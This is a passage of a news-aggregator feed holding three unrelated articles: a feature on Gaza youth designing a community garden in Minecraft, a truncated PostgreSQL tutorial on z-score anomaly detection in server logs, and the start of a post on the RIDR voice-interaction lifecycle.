<p>At 23, living in Gaza, Hamdan has been blighted by three brutal conflicts with Israel, decades of protests, a cycle of rocket fire between Israel and Gaza’s rulers, Hamas, and infighting between Palestinian factions. She faces one of the <a href="https://www.unrwa.org/where-we-work/gaza-strip">worst employment rates</a> in the world, <a href="https://www.unrwa.org/activity/education-gaza-strip">oversubscribed schools</a>, and a territory in which movement is tightly controlled and more than half the population <a href="https://www.theyworkforyou.com/wrans/?id=2020-01-23.7154.h&amp;p=11132">lives on less than $5.50 per day.</a> Live concerts and movie theaters are rare, imports and exports restricted, and <a href="https://www.un.org/unispal/humanitarian-situation-in-the-gaza-strip-fast-facts-ocha-factsheet/">children often used, and killed, for smuggling.</a></p>



<p>Though Hamdan and most of her peers have mobile phones — a lifeline for connecting with the outside world — power cuts are relentless: Az-Zawayda, her home in Deir al-Balah of some 25,000, often has barely <a href="https://www.hrw.org/news/2017/08/20/gaza-we-get-four-hours-electricity-day-if-were-lucky">four hours of electricity a day</a>. “There’s little to do here,” Hamdan said.</p>



<p>Before 2018, Hamdan had certainly never played a video game. That year, she learned to play Minecraft, the wildly popular computer game<strong> </strong>in which players make things out of blocks — but not purely for fun. In 2012, U.N.-Habitat, Microsoft, and Mojang, the company that made Minecraft, teamed up on <a href="https://www.blockbyblock.org/about">Block by Block</a>, a venture that aims to improve marginalized areas by actively engaging community members in public projects. According to the U.N., more than 17,000 people have participated in Block by Block initiatives in around 100 different countries — including three<strong> </strong>projects in Gaza — improving hundreds of thousands of lives in the process.&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/2017-08-23_12.58.05-40x29.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/2017-08-23_12.58.05-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/2017-08-23_12.58.05-400x286.jpg 400w, https://restofworld.org/wp-content/uploads/2020/09/2017-08-23_12.58.05-600x429.jpg 600w, " sizes="(max-width: 640px) 100vw, 600px(max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>Using Minecraft’s building blocks, community groups design a virtual public space, later made into concrete reality. From parks to beaches and even streets themselves, these spaces are a key indicator of the health and sustainability of cities.<strong> </strong>“If made safe, accessible, and welcoming, they can be drivers of civic cohesion, biodiversity, livelihood, and economic growth,” Christelle Lahoud, 30, a program management officer for U.N.-Habitat, told <em>Rest of World</em>. “If not, we tend to see more crime and pollution, reduced productivity, and general social disparities.”&nbsp;</p>



<p>Participants in the Gaza experiment were selected by the Aisha Association for Women and Child Protection, an independent organization and project partner working to achieve gender integration in Gaza. Promising candidates were motivated, interested, and hungry for change.&nbsp;</p>



<p>Hamdan was one of 42 others — young women, mostly — given the chance to imagine a virtually designed town center through the game.<strong> </strong>The project aimed to design and build a community garden for Az-Zawayda — a modest goal.</p>



<p>Fatma Zoqlam, 18, and her sister, Ghada, 17, also made the cut, much to the approval of their mother. “She was all, like, ‘You have to do it! It will improve your confidence! And communication!’” Fatma, wearing a floral hijab and bright-purple dress, told <em>Rest of World</em> over Skype. “Not that I needed persuading.”&nbsp;</p>



<p>But Ghada, a tad more shy, wasn’t quite as up for it. “It made me feel nervous, working in a team with strangers,” she said. The first day, the group visited the space, which was only sand, ruins, and unlit roads. “I stood there and thought, This isn’t going to work,” Fatma said.&nbsp;</p>



<p>The architects introduced the world of Minecraft. “Most of us had never played a video game before,” Hamdan said, “but it was surprisingly user-friendly.” They were split into groups of four. “We took turns figuring out the keys, playing around,” Ghada said. “Once I got going, I didn’t want to stop.”&nbsp;</p>



<p>On the second day, things got heated. Keen to impress teammates, the decision-making adults in the room, and their family and friends, things got competitive. “I wanted to have the optimal design. … Because then my work could be reflected in the actual space!” Fatma said. She leaned forward, “I wanted to be able to say to everyone I knew, I made that!”</p>


    <figure>
      <div>
				<ul>
					<li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/1-41-40x29.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/1-41-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/1-41-400x286.jpg 400w, https://restofworld.org/wp-content/uploads/2020/09/1-41-600x429.jpg 600w, https://restofworld.org/wp-content/uploads/2020/09/1-41-1000x714.jpg 1000w, https://restofworld.org/wp-content/uploads/2020/09/1-41-1600x1143.jpg 1600w, https://restofworld.org/wp-content/uploads/2020/09/1-41-2800x2000.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/2-21-40x29.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/2-21-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/2-21-400x286.jpg 400w, https://restofworld.org/wp-content/uploads/2020/09/2-21-600x429.jpg 600w, https://restofworld.org/wp-content/uploads/2020/09/2-21-1000x714.jpg 1000w, https://restofworld.org/wp-content/uploads/2020/09/2-21-1600x1143.jpg 1600w, https://restofworld.org/wp-content/uploads/2020/09/2-21-2800x2000.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li>
				</ul>
			</div>
      <figcaption>Az-Zawayda Community Garden officially opened on December 31, 2018. Photos courtesy of Project Team.</figcaption>
    </figure>


<p>“I wanted technical approval,” Ghada said. “My group was, er, leader-heavy, though. A boy took charge. He was like, ‘We need to do this, this, and this.’”</p>



<p>What the group concluded was that protective measures were a priority. “We discussed safety a lot,” Hamdan said. “Me and my friends feel scared to leave the house alone. The threat of sexual assault is too much.” (Around 51% of women in Gaza are victims of gender-based violence.) They needed lighting, fencing, security (including a guard), and a separate area for women and families. “The fence was my input,” Ghada said.&nbsp;</p>



<p>For Fatma, aesthetics mattered — plants, trees, a proud fountain. Her team also made a cafeteria and installed<strong> </strong>municipal Wi-Fi to keep residents connected, along with solar panels.&nbsp;</p>



<p>Three female Palestinian architects brought the park to fruition. One of them, Tasneem Omar, 29, described the process as “genuinely eye-opening.” Despite Minecraft’s limitations — the game allows players to use only blocks, no curved shapes — the women’s 3D efforts made her job far simpler.&nbsp;</p>



<p>As the workshop came to a close, Omar drew up a schematic<strong> </strong>for a park based on the team’s work and handed it over to a group of selected contractors. Save for the Wi-Fi — which was costly and might detract from the community experience of the park — they used almost everything in the team’s design.</p>



<p>On December 31, 2018, Az-Zawayda Community Garden opened. Representatives from civil society organizations in the Gaza Strip, local and international NGOs, local universities, and workshop participants attended the launch. “It was a great feeling,” said Hamdan. “I gave a speech, something I wouldn’t have had the confidence to do before.”&nbsp;</p>



<p>Since then, additional projects have begun in Kosovo, Nepal, Lebanon, and Guinea; initiatives in Mozambique, South Africa, Ethiopia, Vietnam, Bangladesh, and Kyrgyzstan are currently underway. The Block by Block Foundation is also supporting coronavirus relief projects in ten affected countries.&nbsp;</p>



<p>For participants, the work is transformative. “We saw our work on the ground,” Fatma said, her eyes wide. “Nothing like this had been done before,” she added. “The municipality had never put us — the public — in charge.”</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/rebuilding-gaza-with-minecraft/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542830</guid>
            <pubDate>Mon, 21 Sep 2020 13:04:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple Anomaly Detection Using Plain SQL]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24542828">thread link</a>) | @haki
<br/>
September 21, 2020 | https://hakibenita.com/sql-anomaly-detection | <a href="https://web.archive.org/web/*/https://hakibenita.com/sql-anomaly-detection">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-progress-indicator="">
        <hr>
<p>Many developers think that having a critical bug in their code is the worst thing that can happen. Well, there is something much worse than that: Having a critical bug in your code and <strong>not knowing about it!</strong></p>
<p>To make sure I get notified about critical bugs as soon as possible, I started looking for ways to find anomalies in my data. I quickly found that information about these subjects tend to get very complicated, and involve a lot of ad-hoc tools and dependencies.</p>
<p>I'm not a statistician and not a data scientist, I'm just a developer. Before I introduce dependencies into my system I make sure I really can't do without them. So, <strong>using some high school level statistics and a fair knowledge of SQL, I implemented a simple anomaly detection system <em>that works</em>.</strong></p>
<figure><img alt="Can you spot the anomaly?<br><small>Photo by <a href=&quot;https://unsplash.com/photos/KmKZV8pso-s&quot;>Ricardo Gomez Angel</a></small>" src="https://hakibenita.com/images/00-sql-anomaly-detection.png"><figcaption>Can you spot the anomaly?<br><small>Photo by <a href="https://unsplash.com/photos/KmKZV8pso-s">Ricardo Gomez Angel</a></small></figcaption>
</figure>
<details open="">
   <summary>Table of Contents</summary>

</details>
<hr>

<hr>
<h2 id="detecting-anomalies"><a href="#detecting-anomalies">Detecting Anomalies</a></h2>
<p>Anomaly in a data series is a significant deviation from some reasonable value. Looking at this series of numbers for example, which number stands out?</p>
<div><pre><span></span>2, 3, 5, 2, 3, 12, 5, 3, 4
</pre></div>


<p>The number that stands out in this series is 12.</p>
<figure><img alt="Scatter plot" src="https://hakibenita.com/images/00-sql-anomaly-detection-scatter-plot.png"><figcaption>Scatter plot</figcaption>
</figure>
<p>This is intuitive to a human, but computer programs don't have intuition...</p>
<p>To find the anomaly in the series we first need to define what a reasonable value is, and then define how far away from this value we consider a significant deviation. A good place to start looking for a reasonable value is the mean:</p>
<div><pre><span></span><span>SELECT</span> <span>avg</span><span>(</span><span>n</span><span>)</span>
<span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span><span>;</span>

<span>       avg</span>
<span>────────────────────</span>
<span>4.3333333333333333</span>
</pre></div>


<p>The mean is ~4.33.</p>
<p>Next, we need to define the deviation. Let's use <a href="https://en.wikipedia.org/wiki/Standard_deviation" rel="noopener">Standard Deviation</a>:</p>
<div><pre><span></span><span>SELECT</span> <span>stddev</span><span>(</span><span>n</span><span>)</span>
<span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span><span>;</span>

<span>      stddev</span>
<span>────────────────────</span>
<span>3.0822070014844882</span>
</pre></div>


<p>Standard deviation is the square root of the <a href="https://en.wikipedia.org/wiki/Variance" rel="noopener">variance</a>, which is the average squared distance from the mean. In this case it's 3.08.</p>
<p>Now that we've defined a "reasonable" value and a deviation, we can define a <em>range</em> of acceptable values:</p>
<div><pre><span></span><span>SELECT</span>
   <span>avg</span><span>(</span><span>n</span><span>)</span> <span>-</span> <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>AS</span> <span>lower_bound</span><span>,</span>
   <span>avg</span><span>(</span><span>n</span><span>)</span> <span>+</span> <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>AS</span> <span>upper_bound</span>
<span>FROM</span>
   <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span><span>;</span>

<span>    lower_bound    │     upper_bound</span>
<span>───────────────────┼────────────────────</span>
<span>1.2511263318488451 │ 7.4155403348178215</span>
</pre></div>


<p>The range we defined is one standard deviation from the mean. Any value outside this range is considered an anomaly:</p>
<div><pre><span></span><span>WITH</span> <span>series</span> <span>AS</span> <span>(</span>
   <span>SELECT</span> <span>*</span>
   <span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span>
<span>),</span>
<span>bounds</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>-</span> <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>AS</span> <span>lower_bound</span><span>,</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>+</span> <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>AS</span> <span>upper_bound</span>
   <span>FROM</span>
       <span>series</span>
<span>)</span>
<span>SELECT</span>
   <span>n</span><span>,</span>
   <span>n</span> <span>NOT</span> <span>BETWEEN</span> <span>lower_bound</span> <span>AND</span> <span>upper_bound</span> <span>AS</span> <span>is_anomaly</span>
<span>FROM</span>
   <span>series</span><span>,</span>
   <span>bounds</span><span>;</span>

<span>n  │ is_anomaly</span>
<span>───┼────────────</span>
<span> 2 │ f</span>
<span> 3 │ f</span>
<span> 5 │ f</span>
<span> 2 │ f</span>
<span> 3 │ f</span>
<span><span>12 │ t</span>
</span><span> 5 │ f</span>
<span> 3 │ f</span>
<span> 4 │ f</span>
</pre></div>


<p>Using the query we found that the value 12 is outside the range of acceptable values, and identified it as an anomaly.</p>
<h3 id="understanding-z-score"><a href="#understanding-z-score">Understanding Z-Score</a></h3>
<p>Another way to represent a range of acceptable values is using a z-score. <a href="https://en.wikipedia.org/wiki/Standard_score" rel="noopener">z-score, or Standard Score</a>, is the number of standard deviations from the mean. In the previous section, our acceptable range was one standard deviation from the mean, or in other words, a z-score in the range ±1:</p>
<div><pre><span></span><span>WITH</span> <span>series</span> <span>AS</span> <span>(</span>
   <span>SELECT</span> <span>*</span>
   <span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span>
<span>),</span>
<span>stats</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>series_mean</span><span>,</span>
       <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>as</span> <span>series_stddev</span>
   <span>FROM</span>
       <span>series</span>
<span>)</span>
<span>SELECT</span>
   <span>n</span><span>,</span>
<span>   <span>(</span><span>n</span> <span>-</span> <span>series_mean</span><span>)</span> <span>/</span> <span>series_stddev</span> <span>as</span> <span>zscore</span>
</span><span>FROM</span>
   <span>series</span><span>,</span>
   <span>stats</span><span>;</span>

<span>n  │         zscore</span>
<span>───┼─────────────────────────</span>
<span> 2 │ -0.75703329861022517346</span>
<span> 3 │ -0.43259045634870009448</span>
<span> 5 │  0.21629522817435006346</span>
<span> 2 │ -0.75703329861022517346</span>
<span> 3 │ -0.43259045634870009448</span>
<span>12 │      2.4873951240050256</span>
<span> 5 │  0.21629522817435006346</span>
<span> 3 │ -0.43259045634870009448</span>
<span> 4 │ -0.10814761408717501551</span>
</pre></div>


<p>Like before, we can detect anomalies by searching for values which are outside the acceptable range using the z-score:</p>
<div><pre><span></span><span>WITH</span> <span>series</span> <span>AS</span> <span>(</span>
   <span>SELECT</span> <span>*</span>
   <span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span>
<span>),</span>
<span>stats</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>series_avg</span><span>,</span>
       <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>as</span> <span>series_stddev</span>
   <span>FROM</span>
       <span>series</span>
<span>),</span>
<span>zscores</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>n</span><span>,</span>
       <span>(</span><span>n</span> <span>-</span> <span>series_avg</span><span>)</span> <span>/</span> <span>series_stddev</span> <span>AS</span> <span>zscore</span>
   <span>FROM</span>
       <span>series</span><span>,</span>
       <span>stats</span>
<span>)</span>
<span>SELECT</span>
   <span>*</span><span>,</span>
   <span>zscore</span> <span>NOT</span> <span>BETWEEN</span> <span>-</span><span>1</span> <span>AND</span> <span>1</span> <span>AS</span> <span>is_anomaly</span>
<span>FROM</span>
   <span>zscores</span><span>;</span>

<span>n  │         zscore          │ is_anomaly</span>
<span>───┼─────────────────────────┼────────────</span>
<span> 2 │ -0.75703329861022517346 │ f</span>
<span> 3 │ -0.43259045634870009448 │ f</span>
<span> 5 │  0.21629522817435006346 │ f</span>
<span> 2 │ -0.75703329861022517346 │ f</span>
<span> 3 │ -0.43259045634870009448 │ f</span>
<span><span>12 │      2.4873951240050256 │ t</span>
</span><span> 5 │  0.21629522817435006346 │ f</span>
<span> 3 │ -0.43259045634870009448 │ f</span>
<span> 4 │ -0.10814761408717501551 │ f</span>
</pre></div>


<p>Using z-score, we also identified 12 as an anomaly in this series.</p>
<h3 id="optimizing-z-score"><a href="#optimizing-z-score">Optimizing Z-Score</a></h3>
<p>So far we used one standard deviation from the mean, or a z-score of ±1 to identify anomalies. Changing the z-score threshold can affect our results. For example, let's see what anomalies we identify when the z-score is greater than 0.5 and when it's greater than 3:</p>
<div><pre><span></span><span>WITH</span> <span>series</span> <span>AS</span> <span>(</span>
   <span>SELECT</span> <span>*</span>
   <span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span>
<span>),</span>
<span>stats</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>series_avg</span><span>,</span>
       <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>as</span> <span>series_stddev</span>
   <span>FROM</span>
       <span>series</span>
<span>),</span>
<span>zscores</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>n</span><span>,</span>
       <span>(</span><span>n</span> <span>-</span> <span>series_avg</span><span>)</span> <span>/</span> <span>series_stddev</span> <span>AS</span> <span>zscore</span>
   <span>FROM</span>
       <span>series</span><span>,</span>
       <span>stats</span>
<span>)</span>
<span>SELECT</span>
   <span>*</span><span>,</span>
<span>   <span>zscore</span> <span>NOT</span> <span>BETWEEN</span> <span>-</span><span>0.5</span> <span>AND</span> <span>0.5</span> <span>AS</span> <span>is_anomaly_0_5</span><span>,</span>
</span><span>   <span>zscore</span> <span>NOT</span> <span>BETWEEN</span> <span>-</span><span>1</span> <span>AND</span> <span>1</span> <span>AS</span> <span>is_anomaly_1</span><span>,</span>
</span><span>   <span>zscore</span> <span>NOT</span> <span>BETWEEN</span> <span>-</span><span>3</span> <span>AND</span> <span>3</span> <span>AS</span> <span>is_anomaly_3</span>
</span><span>FROM</span>
   <span>zscores</span><span>;</span>

<span>n  │         zscore          │ is_anomaly_0_5 │ is_anomaly_1 │ is_anomaly_3</span>
<span>───┼─────────────────────────┼────────────────┼──────────────┼──────────────</span>
<span> 2 │ -0.75703329861022517346 │ t              │ f            │ f</span>
<span> 3 │ -0.43259045634870009448 │ f              │ f            │ f</span>
<span> 5 │  0.21629522817435006346 │ f              │ f            │ f</span>
<span> 2 │ -0.75703329861022517346 │ t              │ f            │ f</span>
<span> 3 │ -0.43259045634870009448 │ f              │ f            │ f</span>
<span>12 │      2.4873951240050256 │ t              │ t            │ f</span>
<span> 5 │  0.21629522817435006346 │ f              │ f            │ f</span>
<span> 3 │ -0.43259045634870009448 │ f              │ f            │ f</span>
<span> 4 │ -0.10814761408717501551 │ f              │ f            │ f</span>
</pre></div>


<p>Let's see what we got:</p>
<ul>
<li>When we decreased the z-score threshold to 0.5, we identified the value 2 as an anomaly in addition to the value 12.</li>
<li>When we increased the z-score threshold to 3 we did not identify any anomaly.</li>
</ul>
<p>The quality of our results are directly related to the parameters we set for the query. Later we'll see how using backtesting can help us identify ideal values.</p>
<hr>
<h2 id="analyzing-a-server-log"><a href="#analyzing-a-server-log">Analyzing a Server Log</a></h2>
<p>Application servers such as nginx, Apache and IIS write a lot of useful information to access logs. The data in these logs can be extremely useful in identifying anomalies.</p>
<p>We are going to analyze logs of a web application, so the data we are most interested in is the timestamp and the status code of every response from the server. To illustrate the type of insight we can draw from just this data:</p>
<ul>
<li><strong>A sudden increase in 500 status code</strong>: You may have a problem in the server. Did you just push a new version? Is there an external service you're using that started failing in unexpected ways?</li>
<li><strong>A sudden increase in 400 status code</strong>: You may have a problem in the client. Did you change some validation logic and forgot to update the client? Did you make a change and forgot to handle backward compatibility?</li>
<li><strong>A sudden increase in 404 status code</strong>: You may have an SEO problem. Did you move some pages and forgot to set up redirects? Is there some script kiddy running a scan on your site?</li>
<li><strong>A sudden increase in 200 status code</strong>: You either have some significant legit traffic coming in, or you are under a DOS attack. Either way, you probably want to check where it's coming from.</li>
</ul>
<h3 id="preparing-the-data"><a href="#preparing-the-data">Preparing the Data</a></h3>
<p>Parsing and processing logs is outside the scope of this article, so let's assume we did that and we have a table that looks like this:</p>
<div><pre><span></span><span>CREATE</span> <span>TABLE</span> <span>server_log_summary</span> <span>AS</span> <span>(</span>
   <span>period</span> <span>timestamptz</span><span>,</span>
   <span>status_code</span> <span>int</span><span>,</span>
   <span>entries</span> <span>int</span>
<span>);</span>
</pre></div>


<p>The table stores the number of entries for each status code at a given period. For example, our table stores how many responses returned each status code every minute:</p>
<div><pre><span></span><span>db=#</span> <span>SELECT</span> <span>*</span> <span>FROM</span> <span>server_log_summary</span> <span>ORDER</span> <span>BY</span> <span>period</span> <span>DESC</span> <span>LIMIT</span> <span>10</span><span>;</span>

<span>        period         │ status_code │ entries</span>
<span>───────────────────────┼─────────────┼─────────</span>
<span>2020-08-01 18:00:00+00 │         200 │    4084</span>
<span>2020-08-01 18:00:00+00 │         404 │       0</span>
<span>2020-08-01 18:00:00+00 │         400 │      24</span>
<span>2020-08-01 18:00:00+00 │         500 │       0</span>
<span>2020-08-01 17:59:00+00 │         400 │      12</span>
<span>2020-08-01 17:59:00+00 │         200 │    3927</span>
<span>2020-08-01 17:59:00+00 │         500 │       0</span>
<span>2020-08-01 17:59:00+00 │         404 │       0</span>
<span>2020-08-01 17:58:00+00 │         400 │       2</span>
<span>2020-08-01 17:58:00+00 │         200 │    3850</span>
</pre></div>


<p>Note that the table has a row for every minute, even if the status code was never returned in that minute. Given a table of statuses, it's very tempting to do something like this:</p>
<div><pre><span></span><span>-- Wrong!</span>
<span>SELECT</span>
   <span>date_trunc</span><span>(</span><span>'minute'</span><span>,</span> <span>timestamp</span><span>)</span> <span>AS</span> <span>period</span><span>,</span>
   <span>status_code</span><span>,</span>
   <span>count</span><span>(</span><span>*</span><span>)</span> <span>AS</span> <span>entries</span>
<span>FROM</span>
   <span>server_log</span>
<span>GROUP</span> <span>BY</span>
   <span>period</span><span>,</span>
   <span>status_code</span><span>;</span>
</pre></div>


<p>This is a common mistake and it can leave you with gaps in the data. Zero is a value, and it holds a significant meaning. A better approach is to create an "axis", and join to it:</p>
<div><pre><span></span><span>-- Correct!</span>
<span>WITH</span> <span>axis</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>status_code</span><span>,</span>
       <span>generate_series</span><span>(</span>
           <span>date_trunc</span><span>(</span><span>'minute'</span><span>,</span> <span>now</span><span>()),</span>
           <span>date_trunc</span><span>(</span><span>'minute'</span><span>,</span> <span>now</span><span>()</span> <span>-</span> <span>interval</span> <span>'1 hour'</span><span>),</span>
           <span>interval</span> <span>'1 minute'</span> <span>*</span> <span>-</span><span>1</span>
       <span>)</span> <span>AS</span> <span>period</span>
   <span>FROM</span> <span>(</span>
       <span>VALUES</span> <span>(</span><span>200</span><span>),</span> <span>(</span><span>400</span><span>),</span> <span>(</span><span>404</span><span>),</span> <span>(</span><span>500</span><span>)</span>
   <span>)</span> <span>AS</span> <span>t</span><span>(</span><span>status_code</span><span>)</span>
<span>)</span>
<span>SELECT</span>
   <span>a</span><span>.</span><span>period</span><span>,</span>
   <span>a</span><span>.</span><span>status_code</span><span>,</span>
   <span>count</span><span>(</span><span>*</span><span>)</span> <span>AS</span> <span>entries</span>
<span>FROM</span>
   <span>axis</span> <span>a</span>
   <span>LEFT</span> <span>JOIN</span> <span>server_log</span> <span>l</span> <span>ON</span> <span>(</span>
       <span>date_trunc</span><span>(</span><span>'minute'</span><span>,</span> <span>l</span><span>.</span><span>timestamp</span><span>)</span> <span>=</span> <span>a</span><span>.</span><span>period</span>
       <span>AND</span> <span>l</span><span>.</span><span>status_code</span> <span>=</span> <span>a</span><span>.</span><span>status_code</span>
   <span>)</span>
<span>GROUP</span> <span>BY</span>
   <span>period</span><span>,</span></pre></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hakibenita.com/sql-anomaly-detection">https://hakibenita.com/sql-anomaly-detection</a></em></p>]]>
            </description>
            <link>https://hakibenita.com/sql-anomaly-detection</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542828</guid>
            <pubDate>Mon, 21 Sep 2020 13:04:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to Voice and Multimodal Interactions]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542826">thread link</a>) | @JanKoenig
<br/>
September 21, 2020 | https://www.context-first.com/introduction-voice-multimodal-interactions/ | <a href="https://web.archive.org/web/*/https://www.context-first.com/introduction-voice-multimodal-interactions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><section><p>“<em>Are you open tomorrow?</em>”</p><p>“<em>Yes, we open at 9am.</em>”</p><p>The conversation above seems very simple, right? The goal of most voice and chat interactions is to provide a user experience that is as simple as possible. However, this doesn’t mean that these types of interactions are as easy to design or to build. Quite the contrary. There is a lot going on under the hood that the users never see (or, in this case, hear).</p><p>And it only becomes more complex as more modalities are added: With additional interfaces like visual and touch, maybe even gestures or sensory input, the design and development challenge can become multidimensional quickly. This is why it’s important to have a clear, abstracted process when building multimodal experiences.</p><p>In this post, I will walk you through some of the steps involved in building voice and multimodal interactions. We’ll take a look at the RIDR lifecycle, a concept that we introduced with the <a href="https://www.context-first.com/introducing-jovo-v3-the-voice-layer/">launch of Jovo v3</a> earlier this year.</p><p>To kick things off, let’s take a look at a typical voice interaction and then see how this can be expanded to multimodal experiences.</p><h2 id="example-of-a-voice-interaction">Example of a Voice Interaction</h2><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/conversation-intro.png"><img src="https://ghost.jovo.tech/content/images/2020/09/conversation-intro.png"></a></figure><p>In the introduction of this post, a user asks a question (“<em>Are you open tomorrow?</em>”) and the system (e.g. a bot or an assistant) responds with a (hopefully appropriate) answer like “<em>Yes, we open at 9am.</em>”</p><p>This is what we call an <em>interaction</em>. <a href="https://www.jovo.tech/docs/requests-responses">In our definition</a>, an interaction is a single pair of a user request and a system response. </p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/request-response.png"><img src="https://ghost.jovo.tech/content/images/2020/09/request-response.png"></a></figure><p>What might appear like a simple interaction actually requires many steps under the hood to deliver a meaningful response. It looks more like this:</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/ridr-lifecycle.png"><img src="https://ghost.jovo.tech/content/images/2020/09/ridr-lifecycle.png"></a></figure><p>With the <a href="https://context-first.com/introducing-jovo-v3-the-voice-layer-bf369db4808e">launch of Jovo v3</a>, we introduced the RIDR (<em>Request - Interpretation - Dialog &amp; Logic - Response</em>) lifecycle with the goal to establish an abstracted process to get from request to response and make it possible to plug into (interchangeable) building blocks for each step.</p><p>The pipeline includes four key elements:</p><ul><li><u>R</u>equest</li><li><u>I</u>nterpretation</li><li><u>D</u>ialog &amp; Logic</li><li><u>R</u>esponse</li></ul><p>Let’s briefly take a look at each of the steps.</p><h3 id="request">Request</h3><p>The <em>Request</em> step starts the interaction and captures necessary data.</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/ridr-request.png"><img src="https://ghost.jovo.tech/content/images/2020/09/ridr-request.png"></a></figure><p>If we use a voice-first device as an example, there are a few things that need to be handled, like:</p><ul><li>Knowing when to record input (e.g. after a button is pushed or using wake word detection)</li><li>Recording the input</li><li>Figuring out when the person stopped speaking (e.g. with silence detection)</li><li>Processing audio to be passed to the next step</li></ul><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/request-detail.jpg"><img src="https://ghost.jovo.tech/content/images/2020/09/request-detail.jpg"></a></figure><p>These initial steps usually happen on the device the user is interacting with. Platforms like Amazon Alexa do all these things for you, but if you want to build your own custom voice system (e.g. voice-enabling a web or 